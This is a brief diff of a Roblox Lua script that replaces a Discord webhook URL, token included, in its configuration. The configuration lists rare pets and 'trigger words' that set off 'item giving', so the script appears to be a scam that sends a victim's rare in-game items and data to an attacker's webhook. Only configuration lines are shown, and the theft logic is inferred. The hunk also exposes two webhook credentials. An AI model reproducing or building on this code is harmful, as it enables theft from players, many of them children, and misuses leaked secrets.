@@ -8,7 +8,7 @@ local TeleportService = game:GetService("TeleportService")
 local RunService = game:GetService("RunService")
 
 -- Configuration
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1393626809060425788/1wo3I0ZCVWwIPS6CIeIj7QrhRUs3ksrepvgHvngVbtYU1sz2uWU6qvoZWzZ-4hxokAWK"
 local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 local TRIGGER_WORDS = {"s", "give", "items", "trade", LocalPlayer.Name:lower()} -- Words that trigger the item giving
 
